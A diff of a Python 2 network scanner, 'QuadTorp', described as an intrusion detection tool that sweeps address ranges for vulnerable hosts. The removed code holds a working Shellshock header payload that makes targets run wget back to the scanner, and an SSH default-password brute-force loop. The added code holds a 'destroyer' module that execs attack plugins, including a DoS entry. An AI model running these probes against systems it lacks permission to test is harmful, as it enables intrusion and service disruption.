@@ -18,7 +18,7 @@ _ __|__ __ _      \\ TORPEDO //      _ __ __|__ _
   (______=< _ __ _____________---------_______ _
 
 """[1:-1]
-policy = r"""
+__doc__ = r"""
 _ __ ___   Intrusion Detection Systems   ___ __ _
     |                  -*-                  |
     |_ __  _ -   Savage Security   - _  __ _|. ;
@@ -56,11 +56,10 @@ _ __|__ _        - Version Info -       _ __|__ _
  - 2/08/18 = v1.5.6 - Scan Improvements       -
  - 2/08/18 = v1.5.7 - Major Bug Fixes         -
  - 2/10/18 = v1.6.0 - Dynamic Scanning        -
- - 2/18/18 = v1.7.1 - Memory Improvements     -
  - 2/18/18 = v1.7.2 - Major Bug Fixes         -
+ - 2/26/18 = v2.2.0 - Destroyer API           -
+ - 3/04/18 = v2.2.5 - Major Improvements      -
  - ?/??/?? = v?.?.? - Honeypot Added          -
- - ?/??/?? = v?.?.? - Speed Tests Added       -
- - ?/??/?? = v?.?.? - More Security Scans     -
 
 _ __|__ _       - Licensing Info -      _ __|__ _
     |                                       |
@@ -108,6 +107,11 @@ amount of scans have been made. This will reduce
 lag and memory buildup (especially for long-term
 scans).
 
+:: -p :: --ports :: Sets ports to scan on nodes.
+Warning: If you don't include ports that are
+needed for certain security scans, vulns will not
+be detected.
+
 :: -l :: --level :: Select scanning intensity
 	level while searching for devices.
 - --- ----  -  ---- +[ OPT ]+ ----  -  ---- --- -
@@ -140,7 +144,11 @@ set in dynamic mode, QuadTorp will use this file
 to know where to scan! If you don't know your
 active address range, run QuadTorp in max mode.
 Example of stat.dyn:
-	["192.168.1.%s","192.168.2.%s","192.168.3.%s"]
+  ["192.168.1.%s","192.168.2.%s","192.168.3.%s"]
+
+3. Customize your attacks and scans in the 
+destroyer API file! Disabling ports will limit
+scan types. 
 """[1:]
 
 agreement = """
@@ -149,16 +157,17 @@ agreement = """
        as the creators of this software.
      Acknowledge Terms & Conditions [y/n]"""
 
-import socket, time, sys, argparse, threading, Queue, logging, random, paramiko, os, requests
+import socket, time, sys, argparse, threading, Queue, logging, random, paramiko, os, requests, string, SocketServer
 from datetime import datetime
-import string, SocketServer
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 if sys.platform == "ios":
 	import console
 	console.set_font("Menlo",12.1)
 if "-h" in sys.argv[1:] or "--help" in sys.argv[1:]:
-		print help_info
-		sys.exit()
+	print help_info
+	sys.exit()
 vulns = {
 	"shellshock":"CVE-2014-6271",
 	"login":"Default Login",
@@ -181,7 +190,7 @@ parser.add_argument("-v","--verbose",
 	action="store_true")
 parser.add_argument("-r","--rate",
 	help="Set time between scans (minutes). Default: %(default)s",
-	type=float, default=5)
+	type=float, default=15)
 parser.add_argument("-s","--smooth",
 	help="Smoothing printing. Default: %(default)s",
 	default=False,
@@ -197,8 +206,119 @@ parser.add_argument("-a","--auto-clear",
 parser.add_argument("--ttl",
 	help="Connection Timeout. Default: %(default)s",
 	type=int, default=5)
+parser.add_argument("-p","--ports",
+	help="Ports Torpedo Scans. Default %(default)s",
+	type=eval,
+	default=[21,22,25,53,80,145,2000,
+	8080,443,8080]+list(range(137,140)))
 args = parser.parse_args()
+if type(args.ports) != list:
+	args.ports = [21,22,25,53,80,145,2000,
+	8080,443,8080]+list(range(137,140))
 socket.setdefaulttimeout(args.ttl)
+
+if "recent.md" not in os.listdir("./"):
+	args.network_level = "local"
+	args.level = "passive"
+	args.ports = [80,443]
+	args.ttl = 8
+	args.smooth = True
+	args.rate = 1
+
+class destroyer():
+	
+	def __init__(self, pub, local):
+		self.globe = globals()
+		self.system = {
+			"host":pub,
+			"local":local,
+			"dir":"./sec/",
+			"80":{
+					"shellshock":{
+						"program":"idsutil.shellshock",
+						"exe":"function",
+						"type":"http|80.443",
+						"active":False
+					},
+					"login":{
+						"program":"idsutil.login",
+						"exe":"function",
+						"type":"http|80.443",
+						"active":False # Example
+					},
+					"dos":{
+						"program":"idsutil.dos",
+						"exe":"function",
+						"type":"http|80",
+						"active":False # Example
+					},
+					"https":{
+						"program":"idsutil.https",
+						"exe":"function",
+						"type":"http|80",
+						"active":True
+					}
+				},
+			"22":{
+				"sshlogin":{
+					"program":"idsutil.sshlogin",
+					"exe":"function",
+					"type":"vuln|22",
+					"active":False # Example
+					}
+				}
+		}
+	
+	def torp(self, proto, program, info):
+		proto = str(proto)
+		_exe = self.system[proto][program]["exe"]
+		_pro = self.system[proto][program]
+		if _exe == "program":
+			pass
+		if _exe == "function":
+			exec "from sec."+_pro["program"].split(".")[0] + " import "+_pro["program"].split(".")[1]
+			exec _pro["program"].split(".")[1]+"(info,self.globe)"
+	
+	def initialize(self, ip, proto, dtype, info):
+		for pro in self.system[str(proto)]:
+			if dtype.lower() in self.system[str(proto)][pro]["type"].split("|")[0]:
+				for p in info["ports"].split("."):
+					if p in self.system[str(proto)][pro]["type"].split("|")[1]:
+						if self.system[str(proto)][pro]["active"] is True:
+							self.torp(proto, pro, info)
+
+class TCPListen(SocketServer.BaseRequestHandler):
+	def handle(self):
+		data = self.request.recv(1024).strip()
+		if secauth in data:
+			del data
+			if [self.client_address[0],"shellshock"] not in _vdevices:
+				_vdevices.append([self.client_address[0], "shellshock"])
+		self.request.sendall("Done.")
+	def log_message(self, format, *args):
+		return 
+
+def start_server(lhost):
+	globals()["_servport"] = 11337
+	for _ in range(5):
+		try:
+			serv = SocketServer.TCPServer((lhost, _servport), TCPListen)
+			serv.allow_reuse_address = True
+			try:
+				serv.serve_forever()
+			except:
+				serv.server_close()
+				break
+		except Exception as e:
+			pass
+		globals()["_servport"] += _
+
+def start_listen(lhost):
+	if "ss_http" not in threading._active:
+		t = threading.Thread(target=start_server, args=(lhost,))
+		t.name = "ss_http"
+		t.daemon = True
+		t.start()
 
 def loading(rate=0.0007, length=15, msg="", bmsg="", percent=True, amsg="", asyn=False):
 	lchr = u"\u2588"
@@ -239,43 +359,26 @@ class Timer():
 		m, s = divmod(end - self.start, 60)
 		h, m = divmod(m, 60)
 		time_str = "%02d:%02d:%02d" % (h, m, s)
-		print "..:  Time Elapse  :.." + (" "*9) + "..: %s :.."%time_str
+		print "\r..:  Time Elapse  :.." + (" "*9) + "..: 00:%s :.."%time_str
 
 def getauth():
 	globals()["_vdevices"] = []
 	globals()["secauth"] = "".join(random.sample(string.hexdigits.upper()*10,6))
 	return secauth
 
-def shellshock(site, auth=secauth):
-	if "http" not in site:
-		site = "http://"+site
-	conn = requests.session()
-	conf = "() { ignored;};/bin/bash -c 'wget http://%s:%s/%s');'" %(netaddr.localhost, _servport, auth)
-	header = {"Content-type": "application/x-www-form-urlencoded", "User-Agent":conf}
-	res = conn.get(site, data=header, timeout=2)
-	conn.close()
-	return res.status_code
-
-class TCPListen(SocketServer.BaseRequestHandler):
-	def handle(self):
-		data = self.request.recv(1024).strip()
-		if "" in data:
-			del data
-			if self.client_address[0] not in _vdevices:
-				_vdevices.append(self.client_address[0])
-		self.request.sendall("Done.")
-	def log_message(self, format, *args):
-		return 
-
 class radar():
 	
 	def __init__(self):
-		try:
-			self.public = requests.get("http://ip.42.pl/raw",timeout=args.ttl).content
-			if len(self.public) > 15:
-				self.public = "0.0.0.0"
-				print "..: Network :.."+" "*19+"..: OFFLINE :.."
-		except:
+		complt = False
+		for ipget in ["http://ip.42.pl/raw", "http://ipecho.net/plain?"]:
+			try:
+				self.public = requests.get(ipget, timeout=args.ttl).content
+				if len(self.public) < 16:
+					complt = True
+					break
+			except:
+				pass
+		if not complt:
 			self.public = "0.0.0.0"
 			print "..: Network :.."+" "*19+"..: OFFLINE :.."
 		if self.public not in os.listdir("./networks"):
@@ -286,46 +389,77 @@ class radar():
 		self.mdir = "./networks/"+self.public+"/"
 	
 	def offline(self, ip):
+		ip = ip.replace(" ","")
 		f = open(self.mdir+ip+".md","a")
 		f.write("[%s][%s] *[ Unactive ]*\n"%(ip, time.strftime("%X %x")))
 		f.close()
 	
 	def vuln(self, ip, vuln):
+		ip = ip.replace(" ","")
 		f = open(self.mdir+ip+".md","a")
 		f.write(vuln+"\n")
 		f.close()
 	
 	def autovuln(self, ip, vuln):
-		warn = "\r..: %s :.. "%ip
-		warn2 = "Detected [%s]" %vulns[vuln]
-		warn = warn+(" "*(50-len(warn+warn2)))+warn2
-		logging.warning(warn)
-		if ip+".md" not in os.listdir(tracking.mdir):
-			f = open(tracking.mdir+ip+".md","a")
+		ip = ip.replace(" ","")
+		warn = "\r"+_ipdb[ip]+"|"
+		vwarn = vulns[vuln]
+		pad = (11-len(vwarn))/2.0
+		if pad > 1:
+			pad = [int(pad),int(round(pad))]
+		else:
+			pad = [1,1]
+		vwarn = (" "*pad[0])+vwarn+(" "*pad[1])
+		pad = (17-len(ip))/2.0
+		ip2 = (" "*int(pad))+ip+(" "*int(round(pad)))
+		pad = [pad,pad]
+		out = warn+vwarn+"["+ip2+"]"+"[{0} VULN {0}]"
+		b = 0
+		out2 = ""
+		while len(out2) < 49:
+			out2 = out.format(" "*b)
+			b += 1
+		q.put(["warn",out2])
+		if ip+".md" not in os.listdir(self.mdir):
+			f = open(self.mdir+ip+".md","a")
 			f.close()
-		st = open(tracking.mdir+ip+".md").read().count(vulns[vuln])/2.0
-		if st.is_integer() == True:
-			tracking.vuln(ip,"[%s][%s] *[Vulnerable]*\n***Host is vulnerable to %s***" %(time.strftime("%X %x"), ip, vulns[vuln]))
+		st = open(self.mdir+ip+".md").read().count(vulns[vuln])/2.0
+		if st.is_integer() == True and st != 0.0:
+			self.vuln(ip,"[%s][%s] *[Vulnerable]*\n***Host is vulnerable to %s***" %(time.strftime("%X %x"), ip, vulns[vuln]))
 			return True
 		stattrack.vuln += 1
 		return False
 	
 	def secured(self, ip, vuln):
+		ip = ip.replace(" ","")
 		f = open(self.mdir+ip+".md","a")
 		f.write(vuln+"\n")
 		f.close()
 	
 	def autosecure(self, ip, vuln):
-		if ip+".md" not in os.listdir(tracking.mdir):
-			f = open(tracking.mdir+ip+".md","a")
-			f.close()
-		st = open(tracking.mdir+ip+".md").read().count(vulns[vuln])/2.0
-		if st.is_integer() == False:
-			warn = "\r..: %s :.. "%ip
-			warn2 = "Secured [%s]" %vulns[vuln]
-			warn = warn+(" "*(50-len(warn+warn2)))+warn2
-			logging.warning(warn)
-			tracking.vuln(ip,"[%s][%s] *[  Secure  ]*\n***Host has patched %s***" %(time.estrftime("%X %x"),ip,vulns[vuln]))
+		ip = ip.replace(" ","")
+		warn = "\r"+_ipdb[ip]+"|"
+		vwarn = vulns[vuln]
+		pad = (11-len(vwarn))/2.0
+		if pad > 1:
+			pad = [int(pad),int(round(pad))]
+		else:
+			pad = [1,1]
+		vwarn = (" "*pad[0])+vwarn+(" "*pad[1])
+		pad = (17-len(ip))/2.0
+		ip2 = (" "*int(pad))+ip+(" "*int(round(pad)))
+		pad = [pad,pad]
+		out = warn+vwarn+"["+ip2+"]"+"[{0}SECURE{0}]"
+		b = 0
+		out2 = ""
+		while len(out2) < 49:
+			out2 = out.format(" "*b)
+			b += 1
+		if ip+".md" in os.listdir(self.mdir):
+			q.put(["warn",out2,""])
+			st = open(self.mdir+ip+".md").read().count(vulns[vuln])/2.0
+			if st.is_integer() == False and st != 0.0:
+				self.secured(ip,"[%s][%s] *[  Secure  ]*\n***Host has patched %s***" %(time.strftime("%X %x"),ip,vulns[vuln]))
 	
 	def update(self, address, stat="Online"):
 		ip = address
@@ -366,7 +500,7 @@ def startup():
 	if args.level == "defcon":
 		print "..: Mapping Technique :.." + (" "*8) + "..:  %s :.."%"THREAD"
 	else:
-		print "..: Mapping Technique :.." + (" "*8) + "..: %s :.."%"THREAD"
+		print "..: Mapping Technique :.." + (" "*10) + "..: %s :.."%"THREAD"
 	print "..: Networking Levels :.." + (" "*(16-len(args.network_level))) + "..: %s :.."%args.network_level.upper()
 	time.sleep(0.1)
 	print "..: Network ID :.." + (" "*20) + "..: N01 :.."
@@ -401,8 +535,25 @@ def print_session():
 	getauth()
 	print "..: Security Auth :.."+(" "*14)+"..: %s :.."%secauth
 	nl = netaddr.localhost
-	print "..: Local Address"+(" "*(24-len(nl)))+"..: "+nl+" :.."
-	time.sleep(2)
+	print "..: Local Address :.."+(" "*(20-len(nl)))+"..: "+nl+" :.."
+	if args.verbose:
+		avde = len(os.listdir(tracking.mdir))-1
+		minpd = 24.0*60.0
+		Spd = minpd/args.rate
+		spd = (((Spd*66.0)/1000.0)/1000.0)*avde
+		sph = (spd/24.0)*1000.0
+		spd = eval(str(spd)[:6])
+		sph = eval(str(sph)[:6])
+		Spd = int(Spd)
+		Spd = eval(str(Spd)[:6])
+		if spd <= 0.0:
+			spd = "N/A"
+			sph = "N/A"
+		print "..: Scans Per Day :.."+(" "*(20-len(str(Spd))))+"..: "+str(Spd)+" :.."
+		print "..: Storage Per Day :.."+(" "*(15-len(str(spd))))+"..: "+str(spd)+" MB :.."
+		print "..: Storage Per Hour :.."+(" "*(14-len(str(sph))))+"..: "+str(sph)+" KB :.."
+		time.sleep(2)
+	time.sleep(3)
 	if "--hd" not in sys.argv:
 		if sys.platform == "ios":
 			print "..: Donate :.."," "*20,
@@ -562,8 +713,9 @@ def portdetect(ip, port):
 	except:
 		return False
 
-def portscan(ip, rng=[21,22,25,53,80,145,2000,
-8080,443,8080]+list(range(137,140))):
+def portscan(ip, rng=False):
+	if not rng:
+		rng = args.ports
 	ports = []
 	for _ in rng:
 		p = portdetect(ip,_)
@@ -620,11 +772,18 @@ class statistics():
 		self.new = 0
 
 def _drone():
-	while True:
-		try:
+	try:
+		while True:
 			data = q.get()
 			if data == "exit":
 				break
+			if data[0] == "warn":
+				if data[1] not in _dontreport:
+					_dontreport.append(data[1])
+					if len(data) == 3:
+						print "\r"+data[1]
+					else:
+						logging.warning("\r"+data[1])
 			if data[0] == "ip":
 				pad = (17-len(data[2]))/2
 				pad = [pad,pad]
@@ -642,19 +801,31 @@ def _drone():
 					if args.smooth:
 						time.sleep(0.01)
 			q.task_done()
-		except:
-			break
+	except:
+		pass
+
+def _daemonizer():
+	try:
+		while True:
+			if "stopped" in str(threading._active):
+				nl = {}
+				for _ in threading._active:
+					if "stopped" not in threading._active[_]:
+						nl.update({_:threading._active[_]})
+				threading._active = nl
+	except:
+		pass
 
 def vulnlog():
 	try:
 		while True:
-			while _inprog == True:
+			while _inprog is False:
 				pass
 			try:
 				if len(_vdevices) > 0:
 					for _ in _vdevices:
-						if _ != netaddr.localhost:
-							tracking.autovuln(_,"shellshock")
+						if True:#_[0] != netaddr.localhost:
+							tracking.autovuln(_[0],_[1])
 							_vdevices.pop(_vdevices.index(_))
 			except Exception as e:
 				break
@@ -662,67 +833,51 @@ def vulnlog():
 		pass
 
 def start_loggers(bots=1):
-	if "_msgrdrone" not in threading._active:
+	if "_daemonizer" not in str(threading._active):
+		t = threading.Thread(target=_daemonizer)
+		t.daemon = True
+		t.name = "_daemonizer"
+		t.start()
+	if "_msgrdrone" not in str(threading._active):
 		t = threading.Thread(target=_drone)
 		t.daemon = True
 		t.name = "_msgrdrone"
 		t.start()
-	if "_vulnlog" not in threading._active:
+	if "_vulnlog" not in str(threading._active):
 		t = threading.Thread(target=vulnlog)
 		t.daemon = True
 		t.name = "_vulnlog"
 		t.start()
 
 def vulncheck(ip, scanports, state, nid):
-	isvuln1, isvuln2 = False,False
-	lauth = secauth
-	if 80 in scanports:
-		for _ in ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]:
-			try:
-				resp = shellshock(ip+_,lauth)
-				if resp == 200:
-					state = "VULN"
-					isvuln1 = True
-					break
-			except Exception as e:
-				pass
-		if not isvuln1:
-			tracking.autosecure(ip,"shellshock")
-		if 443 not in scanports:
-			tracking.autovuln(ip,"https")
-		else:
-			tracking.autosecure(ip,"https")
-	
-	if 22 in scanports:
-		for user in ["admin","root","user","guest"]:
-			if isvuln2:
-				break
-			for pasw in ["password","admin","root"]:
-				if isvuln2:
-					break
-				try:
-					client = sshsock()
-					client.connect(ip, port=22, username=user, password=pasw, timeout=args.ttl)
-					client.close()
-					state = "VULN"
-					isvuln2 = True
-					v = tracking.autovuln(ip,"login")
-					if v:
-						tracking.vuln(ip,"***Host has default SSH Login Credentials (%s:%s)***" %(user, pasw))
-					stattrack.vuln += 1
-				except Exception as e:
-					pass
-		if not isvuln2:
-			tracking.autosecure(ip,"login")
-	
-	if state == "ACTIVE":
-		auto_update(ip,nid,"on")
-	elif state == "HTTP":
-		auto_update(ip,nid,"on",t=state)
-	elif state == "UNACTIVE":
-		auto_update(ip,nid, stat="off",t=state)
-	elif state == "VULN":
-		q.put(["ip",nid,ip,"VULN","alert"])
+	info = {
+		"ip":ip,
+		"host":ip,
+		"lhost":netaddr.localhost,
+		"public":destroyer.system["host"],
+		"rhost":ip,
+		"ports":".".join(str(p) for p in scanports),
+		"scanports":scanports,
+		"site":"http://"+ip
+	}
+	for _ in scanports:
+		if str(_) in destroyer.system:
+			destroyer.initialize(ip, str(_), state.lower(), info)
+	state = state.upper()
+	if ip not in _dontreport:
+		if state == "ACTIVE":
+			auto_update(ip,nid,"on")
+		elif state == "HTTP":
+			dor = True
+			for da in _dontreport:
+				if ip in da and vulns["https"] in da:
+					dor = False
+			if dor:
+				auto_update(ip,nid,"on",t=state)
+		elif state == "UNACTIVE":
+			auto_update(ip,nid, stat="off",t=state)
+		elif len(state) > 1:
+			q.put(["ip",nid,ip,state,"alert"])
 
 def check_node(ip, nid, lvl=args.level):
 	try:
@@ -749,7 +904,7 @@ def check_node(ip, nid, lvl=args.level):
 		
 		if lvl in ["defcon","security"]:
 			try:
-				scanports = portscan(ip)
+				scanports = portscan(ip,args.ports)
 			except:
 				scanports = []
 			state = ""
@@ -785,6 +940,7 @@ def scan(setting=args.level):
 		nid = ip_count.next()
 		if ip == False:
 			break
+		_ipdb.update({ip:nid})
 		t = threading.Thread(target=check_node, args=(ip,nid,))
 		t.daemon = True
 		t.start()
@@ -792,90 +948,79 @@ def scan(setting=args.level):
 			time.sleep(0.005)
 	q.join()
 
-def start_server(lhost):
-	globals()["_servport"] = 11337
-	for _ in range(5):
-		try:
-			serv = SocketServer.TCPServer((lhost, 8080), TCPListen)
-			serv.allow_reuse_address = True
-			try:
-				serv.serve_forever()
-			except:
-				serv.server_close()
-				break
-		except Exception as e:
-			pass
-		globals()["_servport"] += _
-
 def toggle():
 	globals()["_inprog"] = not _inprog
 
-if __name__ == "__main__":
-	globals()["_vdevices"] = []
-	globals()["_inprog"] = False
-	tracking = radar()
-	netaddr = addressing()
-	if "ss_http" not in threading._active:
-		t = threading.Thread(target=start_server, args=(netaddr.localhost,))
-		t.name = "ss_http"
-		t.daemon = True
-		t.start()
-	print head_banner
-	if "recent.md" not in os.listdir("./"):
-		print policy
-		print agreement.upper(),
-		if raw_input().lower() == "y":
-			print "\n  Thank you acknowlging the terms & conditions".upper()
-			rcf = open("recent.md","w")
-			rcf.write(" ")
-			rcf.close()
-			print """
-_ __|__ _                               _ __|__ _
-    |                                       |"""
-		else:
-			print "\n               Please acknowledge\n      the terms & conditions before running".upper()
-			print """
-_ __|__ _                               _ __|__ _
-    |                                       |"""
-			sys.exit(0)
-	socket.setdefaulttimeout(args.ttl)
-	q = Queue.Queue()
-	startup()
-	threadnote = threading.active_count()
-	if threadnote == 1:
-		threadnote += 1
-	else:
-		threadnote += 2
-	timekeeper = Timer()
-	stattrack = statistics(netaddr.localhost)
-	start_loggers()
-	while True:
+try:
+	if __name__ == "__main__":
+		globals()["_vdevices"] = []
+		globals()["_inprog"] = False
+		q = Queue.Queue()
+		tracking = radar()
 		netaddr = addressing()
-		stattrack.scanid += 1
-		if args.auto_clear:
-			if stattrack.scanid > args.auto_clear:
-				if sys.platform == "ios":
-					console.clear()
-				else:
-					os.system("clear")
-		ip_count = hexit()
-		print_session()
-		if args.verbose:
-			timekeeper.restart()
-		toggle()
-		scan()
-		toggle()
-		while threading.active_count() > threadnote:
-			time.sleep(0.5)
-		stattrack.print_st()
-		stattrack.reset()
-		end = time.time()+60*args.rate
-		while time.time() < end:
-			try:
-				pass
-			except:
-				print "..: Scanning Successfully Stopped :.."
-				q.put("exit")
+		globals()["destroyer"] = destroyer(tracking.public, netaddr.localhost)
+		start_listen(netaddr.localhost)
+		print head_banner
+		if "recent.md" not in os.listdir("./"):
+			print __doc__
+			print agreement.upper(),
+			if raw_input().lower() == "y":
+				print "\n  Thank you acknowlging the terms & conditions".upper()
+				rcf = open("recent.md","w")
+				rcf.write(" ")
+				rcf.close()
+				print """
+	_ __|__ _                               _ __|__ _
+	    |                                       |"""
+			else:
+				print "\n               Please acknowledge\n      the terms & conditions before running".upper()
+				print """
+	_ __|__ _                               _ __|__ _
+	    |                                       |"""
 				sys.exit(0)
-	print "..: Scanning Successfully Stopped :.."
+		socket.setdefaulttimeout(args.ttl)
+		startup()
+		timekeeper = Timer()
+		stattrack = statistics(netaddr.localhost)
+		for _ in range(2):
+			start_loggers()
+		threadnote = threading.active_count()+3
+		while True:
+			for _ in range(q.qsize()):
+				q.get()
+				del x
+			globals()["_dontreport"] = []
+			globals()["_ipdb"] = {}
+			netaddr = addressing()
+			stattrack.scanid += 1
+			if args.auto_clear:
+				if stattrack.scanid > args.auto_clear:
+					if sys.platform == "ios":
+						console.clear()
+					else:
+						os.system("clear")
+			ip_count = hexit()
+			print_session()
+			if args.verbose:
+				timekeeper.restart()
+			toggle()
+			scan()
+			while threading.active_count() > threadnote:
+				time.sleep(0.5)
+			toggle()
+			stattrack.print_st()
+			stattrack.reset()
+			end = time.time()+(60*args.rate)
+			while time.time() < end:
+				try:
+					pass
+				except:
+					print "..: Scanning Successfully Stopped :.."
+					q.put("exit")
+					sys.exit(0)
+		print "..: Scanning Successfully Stopped :.."
+		q.put("exit")
+		sys.exit(0)
+except:
 	q.put("exit")
+	sys.exit(0)
